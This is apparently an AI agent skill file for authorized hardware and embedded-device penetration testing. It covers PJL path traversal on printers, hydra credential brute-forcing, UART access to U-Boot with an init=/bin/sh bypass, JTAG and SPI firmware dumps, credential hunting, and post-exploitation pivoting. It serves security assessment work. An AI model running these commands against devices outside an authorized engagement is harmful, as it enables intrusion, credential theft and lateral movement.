---
name: hardware-technique
description: "Auth assessment: hardware/embedded methodology; UART/JTAG/SWD/SPI/I2C, firmware extraction, boot/debug paths, embedded OS evidence."
license: MIT
compatibility: "Linux; hardware tools optional (USB-UART adapter, JTAG probe, ch341a programmer); firmware analysis requires binwalk, strings, ghidra or equivalent."
metadata:
  author: AeonDave
  version: "1.0"
  category: offensive-hardware
---

# Hardware Technique

Goal: gain privileged access to an embedded or peripheral device, extract and analyze its firmware, and identify actionable vulnerabilities — within authorized scope and with minimum physical damage risk.

## When this technique applies

- Black-box assessment of a router, IoT gateway, industrial panel, smart appliance, or custom embedded board.
- Physical access to a printer, kiosk, ATM, or network appliance for red team validation.
- Post-procurement firmware analysis of a device before deployment.
- Red team scenario requiring extraction of credentials, keys, or configuration from a physical device.
- Authorized printer/peripheral exploitation via network-exposed management protocols.

## Boundary with other skills

- **RF and wireless**: signal capture, SDR, Wi-Fi, BLE → `wireless-technique`.
- **ICS field protocols**: Modbus, DNP3, S7, EtherNet/IP exploitation → `ics-technique`.
- **CTF lab hardware tasks**: .sal captures, challenge firmware, CTF framing → `hardware-ctf`.
- **Firmware static/dynamic reversing**: deep binary analysis after extraction → `reversing-technique`.
- **Physical evidence handling**: forensic acquisition → `forensic-technique`.

## Initial triage

Before touching hardware, classify the attack surface and choose the least invasive path.

- **Network before physical**: can the objective be reached via a network-exposed management interface (PJL, Telnet, HTTP admin, SSH) before opening the device?
- **Console vs JTAG vs flash**: UART console is reversible and non-destructive; JTAG halts the processor; direct flash read is offline but risks pad damage.
- **First questions**: what OS/firmware is running, is a bootloader accessible, is there a serial header on the PCB, what management protocols are exposed on the network?
- **Escalation rule**: prefer non-invasive paths (network interface, UART monitor) before destructive paths (direct flash read, JTAG force-halt).

## Agent operating model

```
Loop:
  1. Enumerate attack surface — network services, PCB headers, debug pads, firmware version.
  2. Choose entry path — network management, UART console, JTAG, or direct flash.
  3. Gain access or dump firmware.
  4. Analyze: extract filesystem, find credentials/keys, identify vulnerabilities.
  5. Escalate or pivot as scoped.

Stop when: objective achieved, all paths exhausted, or scope boundary reached.
```

---

## Phase 1 — Network-exposed management interfaces

Attempt before physical access. Many embedded devices expose exploitable management protocols over the network.

### Printer and peripheral protocol attacks (PJL)

PJL (Printer Job Language) is exposed on TCP 9100 or via HTTP-based printer management consoles.

```bash
# Network discovery
nmap -p 9100,515,631 <target>

# PJL filesystem enumeration via raw TCP or HTTP POST form
echo '@PJL FSDIRLIST NAME="0:" ENTRY=1 COUNT=50' | nc <target> 9100

# Read a file via PJL FSUPLOAD
echo '@PJL FSUPLOAD NAME="0:/webServer/default/csconfig" SIZE=4520' | nc <target> 9100

# Path traversal: 0: maps to /printer or /hpmnt on the host
echo '@PJL FSUPLOAD NAME="0:/../../etc/passwd" SIZE=500' | nc <target> 9100

# List saved print jobs — may contain cleartext credentials, PINs, flag comments
echo '@PJL FSDIRLIST NAME="0:/../../home/default/" ENTRY=1 COUNT=50' | nc <target> 9100
echo '@PJL FSUPLOAD NAME="0:/../../home/default/readyjob" SIZE=500' | nc <target> 9100
```

Key PJL targets after traversal:
- `/home/default/readyjob` — JetDirect boot job; may contain cleartext credentials or PIN in `@PJL COMMENT` / `@PJL SET` fields.
- `/etc/passwd`, `/etc/shadow` — device user accounts.
- App config files and embedded web server assets.

### Telnet / SSH / default credentials

```bash
nmap -sV -p 22,23,80,443,8080,8443 <target>
# Common defaults: admin:admin, admin:password, root:root, root:(empty)
hydra -l admin -P /usr/share/wordlists/common-passwords.txt telnet://<target>
```

### Embedded HTTP admin

```bash
curl -sv http://<target>/
nikto -h http://<target>
# Common paths: /cgi-bin/info.cgi, /admin/config, /etc/passwd (traversal)
```

---

## Phase 2 — UART serial console

UART is the most common non-invasive physical entry point. A root shell via UART is typically non-destructive and reversible.

### Identify UART pins

```
PCB inspection:
  1. Locate 3–4 unpopulated through-holes or test pads near the SoC.
  2. Measure voltage: VCC (~3.3 V or 5 V), GND (0 V), TX (idle HIGH), RX (high-impedance).
  3. Use a multimeter or logic analyzer to confirm: TX toggles during boot.
  4. Common layout: GND–TX–RX–VCC or VCC–TX–RX–GND.
  5. JTAGulator can auto-scan up to 24 channels — saves time on dense boards.
```

### Connect and identify baud rate

```bash
# Connect USB-UART adapter: TX→RX, RX→TX, GND→GND
# Do NOT connect VCC if device is self-powered

# Try common baud rates: 115200, 57600, 38400, 19200, 9600
screen /dev/ttyUSB0 115200
# or
minicom -D /dev/ttyUSB0 -b 115200
# If garbled: cycle through rates
```

### Boot console exploitation

```
Watch during boot for:
  - U-Boot / Barebox prompt ("Hit any key to stop autoboot" — press key immediately)
  - Kernel cmdline showing root filesystem and init path
  - Login prompt (try root with no password, or common defaults)

U-Boot useful commands:
  printenv         — dump all env vars (may expose credentials, signing keys, boot args)
  md 0x80000000    — memory dump at address
  setenv bootargs  — modify kernel cmdline before boot
  boot             — resume
```

### Modify boot args for shell access

```bash
# In U-Boot: override init to drop to shell before OS init
setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock2 init=/bin/sh'
boot
# Result: root shell before any authentication
```

### Secure boot bypass (when U-Boot has verified boot)

When signature verification is enabled:
- Read signing key material from NAND/SPI flash (often stored unprotected even on secure-boot devices).
- Patch U-Boot environment to disable `CONFIG_SECUREBOOT` checks (requires flash write).
- Fault injection via voltage glitching on VCC rail during signature check window.
- Check for downgrade attacks: sign a vulnerable older bootloader if key rotates late.

---

## Phase 3 — JTAG / SWD debug interface

Use when UART is unavailable or the boot sequence cannot be interrupted.

### Identify JTAG pins non-destructively

```
Standard ARM JTAG: TCK, TMS, TDI, TDO, nTRST, nSRST, GND, VCC
Compact: JTAG-10, ARM-SWD-10, TAG-Connect
JTAGulator: auto-scan up to 24 channels for JTAG/UART pins
```

### OpenOCD — connect and dump memory

```bash
openocd -f interface/ftdi/olimex-arm-usb-ocd-h.cfg -f target/stm32f4x.cfg

# telnet localhost 4444:
halt
mdw 0x08000000 256                          # dump flash as 32-bit words
dump_image firmware.bin 0x08000000 0x100000 # dump 1 MB
resume
```

---

## Phase 4 — SPI / NAND flash direct dump

Use when device boots from external SPI flash and other paths are blocked.

```bash
# Identify flash chip (read markings on PCB: Winbond W25Q*, Macronix MX25L*, GigaDevice GD25Q*)
# In-circuit dump (device powered off, clip on flash IC)
flashrom -p ch341a_spi -r firmware.bin

# Verify — read twice and compare hashes
flashrom -p ch341a_spi -r firmware2.bin
md5sum firmware.bin firmware2.bin   # must match before any write
```

---

## Phase 5 — Firmware analysis

```bash
# Identify
file firmware.bin
binwalk firmware.bin

# Extract
binwalk -Me firmware.bin

# Credential and key hunting
grep -r "password\|passwd\|secret\|api_key\|private_key\|BEGIN " _firmware.bin.extracted/ 2>/dev/null
find . -name "shadow" -o -name "*.pem" -o -name "*.key" 2>/dev/null

# Architecture identification for disassembly handoff
file _firmware.bin.extracted/squashfs-root/bin/busybox
# → MIPS/ARM/ARC → reversing-technique for binary analysis
```

Key artifacts:
- `/etc/passwd`, `/etc/shadow` — crack offline with hashcat/john.
- `/etc/config/` — OpenWrt-style config with credentials.
- Web server config — hardcoded credentials, API keys.
- Init scripts — startup sequence, privileged operations, service ports.
- TLS certificates/private keys — may be device-wide or model-wide (shared across all units).

---

## Phase 6 — Embedded OS post-exploitation

```bash
# Survey
uname -a; id; cat /etc/passwd; mount; netstat -tlnp 2>/dev/null || ss -tlnp; ps aux || ps

# Credential extraction
cat /etc/shadow 2>/dev/null
find / -name "*.conf" -o -name "*.cfg" 2>/dev/null | xargs grep -l "pass\|key\|secret" 2>/dev/null

# Persistence locations
ls /etc/init.d/ /etc/rc.d/ /etc/crontab 2>/dev/null
```

Pivot paths:
- Extract credentials → spray on adjacent network services.
- Read config → find VPN keys, API tokens, upstream credentials.
- Device certificate → impersonate device on PKI-authenticated network.

---

## Quality gates

- Voltage verified before connecting any probe.
- Flash dump: two independent reads match (md5) before any write.
- JTAG: lab target confirmed; recovery path (JTAG reflash) documented before halting.
- Network management path attempted before physical access.
- All extracted credentials and keys handled per engagement rules of engagement.

## Anti-patterns

- Connecting probes without verifying voltage domain — destroys hardware.
- Starting JTAG write or flash modification on a production device without lab-equivalent risk assessment.
- Trusting a single flash read without verification.
- Skipping network management path — it is fastest, safest, and often sufficient.

## Resources

- [references/serial-console-attacks.md](references/serial-console-attacks.md) — UART pin identification, baud rate brute-force, U-Boot exploitation, boot arg hijack, secure boot bypass patterns.
- [references/firmware-extraction.md](references/firmware-extraction.md) — SPI/NAND dump workflow, flashrom usage, binwalk extraction, filesystem triage, credential and key hunting in extracted images.
- [references/jtag-swd-attacks.md](references/jtag-swd-attacks.md) — JTAG/SWD pin identification, OpenOCD setup, memory dump patterns, fault injection scope.
- [references/peripheral-protocol-attacks.md](references/peripheral-protocol-attacks.md) — PJL filesystem traversal, Telnet/SSH defaults, embedded HTTP admin exploitation, printer NVRAM and job-data extraction.
